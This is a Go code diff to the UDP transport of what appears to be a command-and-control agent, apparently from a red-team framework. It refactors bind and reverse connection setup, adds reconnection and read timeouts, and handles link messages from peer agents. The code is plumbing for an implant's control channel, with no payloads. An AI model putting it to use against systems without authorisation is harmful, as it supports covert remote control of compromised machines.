@@ -22,12 +22,14 @@ import (
 	// Standard
 	"bytes"
 	"crypto/sha256"
+	"encoding/base64"
 	"encoding/gob"
 	"fmt"
 	"math/rand"
 	"net"
 	"strconv"
 	"strings"
+	"time"
 
 	// 3rd Party
 	uuid "github.com/satori/go.uuid"
@@ -177,28 +179,10 @@ func New(config Config) (*Client, error) {
 // Initial executes the specific steps required to establish a connection with the C2 server and checkin or register an agent
 func (client *Client) Initial() error {
 	cli.Message(cli.DEBUG, "Entering clients/udp.Initial() function")
-	var err error
-	switch client.mode {
-	case BIND:
-		client.listener, err = net.ListenPacket("udp", client.address)
-		if err != nil {
-			return fmt.Errorf("clients/udp.Initial(): there was an error listening on %s: %s", client.address, err)
-		}
-		cli.Message(cli.NOTE, fmt.Sprintf("Started %s listener on %s and waiting for a connection...", client, client.address))
-		var n int
-		buffer := make([]byte, 500000)
-		n, client.client, err = client.listener.ReadFrom(buffer)
-		cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from %s", n, client.client))
-		if err != nil {
-			return fmt.Errorf("clients/udp.Initial(): there was an error reading data from %s : %s", client.client, err)
-		}
-	case REVERSE:
-		client.connection, err = net.Dial("udp", client.address)
-		if err != nil {
-			return fmt.Errorf("clients/udp.Initial(): there was an error connecting to %s: %s", client.address, err)
-		}
-		client.client = client.connection.RemoteAddr()
-		cli.Message(cli.NOTE, fmt.Sprintf("successfully connected to %s", client.address))
+
+	err := client.Connect()
+	if err != nil {
+		return fmt.Errorf("clients/udp.Initial(): %s", err)
 	}
 
 	// Authenticate
@@ -251,6 +235,40 @@ func (client *Client) Authenticate(msg messages.Base) (err error) {
 		if authenticated {
 			return
 		}
+	}
+}
+
+// Connect establish a connection with the remote host depending on the Client's type (e.g., BIND or REVERSE)
+func (client *Client) Connect() (err error) {
+	switch client.mode {
+	case BIND:
+		// Will hit this if connection was lost during initialization steps because a Listener will already exist
+		if client.listener == nil {
+			client.listener, err = net.ListenPacket("udp", client.address)
+			if err != nil {
+				return fmt.Errorf("clients/udp.Connect(): there was an error listening on %s: %s", client.address, err)
+			}
+			cli.Message(cli.NOTE, fmt.Sprintf("Started %s listener on %s", client, client.address))
+		}
+		var n int
+		buffer := make([]byte, 500000)
+		cli.Message(cli.NOTE, fmt.Sprintf("Listening for incoming connection..."))
+		n, client.client, err = client.listener.ReadFrom(buffer)
+		cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from %s", n, client.client))
+		if err != nil {
+			return fmt.Errorf("clients/udp.Connect(): there was an error reading data from %s : %s", client.client, err)
+		}
+		return
+	case REVERSE:
+		client.connection, err = net.Dial("udp", client.address)
+		if err != nil {
+			return fmt.Errorf("clients/udp.Connect(): there was an error connecting to %s: %s", client.address, err)
+		}
+		client.client = client.connection.RemoteAddr()
+		cli.Message(cli.NOTE, fmt.Sprintf("successfully connected to %s", client.address))
+		return
+	default:
+		return fmt.Errorf("clients/udp.Connect(): unhandled UDP client mode: %d", client.mode)
 	}
 }
 
@@ -327,8 +345,17 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	delegateBytes := new(bytes.Buffer)
 	err = gob.NewEncoder(delegateBytes).Encode(delegate)
 	if err != nil {
-		err = fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), err)
+		err = fmt.Errorf("clients/udp.Send(): there was an error encoding the %s message to a gob:\r\n%s", messages.String(m.Type), err)
 		return
+	}
+
+	// Recover connection
+	if client.connection == nil {
+		err = client.Connect()
+		if err != nil {
+			err = fmt.Errorf("clients/udp.Send(): %s", err)
+			return
+		}
 	}
 
 	// Write the message
@@ -342,7 +369,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	}
 
 	if err != nil {
-		err = fmt.Errorf("there was an error writing the message to the connection with %s: %s", client.client, err)
+		err = fmt.Errorf("clients/udp.Send(): there was an error writing the message to the connection with %s: %s", client.client, err)
 		return
 	}
 
@@ -352,17 +379,30 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	cli.Message(cli.NOTE, fmt.Sprintf("Waiting for response from %s...", client.client))
 
 	respData := make([]byte, 500000)
+	readTimeout := time.Minute * 5
 
 	switch client.mode {
 	case BIND:
 		n, client.client, err = client.listener.ReadFrom(respData)
 	case REVERSE:
+		err = client.connection.SetReadDeadline(time.Now().Add(readTimeout))
+		if err != nil {
+			cli.Message(cli.DEBUG, fmt.Sprintf("clients/udp.Send(): there was an error setting the connection read deadline to 5 minutes: %s", err))
+		}
 		n, err = client.connection.Read(respData)
 	}
 
-	cli.Message(cli.DEBUG, fmt.Sprintf("Read %d bytes from connection %s", n, client.client))
+	cli.Message(cli.NOTE, fmt.Sprintf("Read %d bytes from connection %s", n, client.client))
 	if err != nil {
-		err = fmt.Errorf("there was an error reading the message from the connection with %s: %s", client.client, err)
+		switch err2 := err.(type) {
+		case net.Error:
+			if err2.Timeout() {
+				err = fmt.Errorf("clients/udp.Send(): The UDP connection read time of %s was reached: %s", readTimeout, err)
+				return
+			}
+		default:
+			err = fmt.Errorf("clients/udp.Send(): there was an error reading the message from the connection with %s: %s", client.client, err)
+		}
 		return
 	}
 
@@ -370,6 +410,23 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	msg, err = client.Deconstruct(respData[:n])
 	if err != nil {
 		err = fmt.Errorf("clients/udp.Send(): there was an error deconstructing the data: %s", err)
+		cli.Message(cli.DEBUG, err.Error())
+		// See if the data was from initial link command from another agent
+		b64 := make([]byte, base64.StdEncoding.EncodedLen(n))
+		_, errBase64 := base64.StdEncoding.Decode(b64, respData[:n])
+		if errBase64 == nil {
+			cli.Message(cli.INFO, fmt.Sprintf("Received Base64 encoded string from %s. Treating as a new connection and re-sending the message...", client.client))
+			// Re-send the original input message
+			returnMessagesNew, errSend := client.Send(m)
+			if errSend != nil {
+				err = fmt.Errorf("clients/udp.Send(): there was an error trying to re-send the message after the response received an init message: %s", errSend)
+				return
+			}
+
+			returnMessages = append(returnMessages, returnMessagesNew...)
+			err = nil
+			return
+		}
 		return
 	}
 
